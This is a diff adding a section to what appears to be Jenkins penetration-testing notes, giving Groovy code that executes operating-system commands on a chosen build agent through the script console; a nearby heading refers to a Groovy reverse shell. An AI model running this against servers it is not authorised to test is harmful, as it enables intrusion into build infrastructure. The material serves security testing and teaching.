@@ -189,6 +189,31 @@ def proc = ['bash', '-c', '''your_long_command_here'''].execute();
 
 Automate it using [this script](./rce/jenkins_rce_admin_script.py).
 
+Command execution on specific slave
+-----------------------------------
+By default execution happens on the master node. Use this script to execute on a specific slave:
+```java
+import hudson.util.RemotingDiagnostics
+import jenkins.model.Jenkins
+
+String agent_name = 'slave_name'
+
+groovy_script = '''
+def proc = ['cmd', '/c', 'cd D:\\\\ && dir data'].execute();
+def os = new StringBuffer();
+proc.waitForProcessOutput(os, System.err);
+println(os.toString());
+'''
+
+String result
+Jenkins.instance.slaves.find { agent ->
+    agent.name == agent_name
+}.with { agent ->
+    result = RemotingDiagnostics.executeGroovy(groovy_script, agent.channel)
+}
+println result
+```
+
 Reverse shell from Groovy
 -------------------------
 
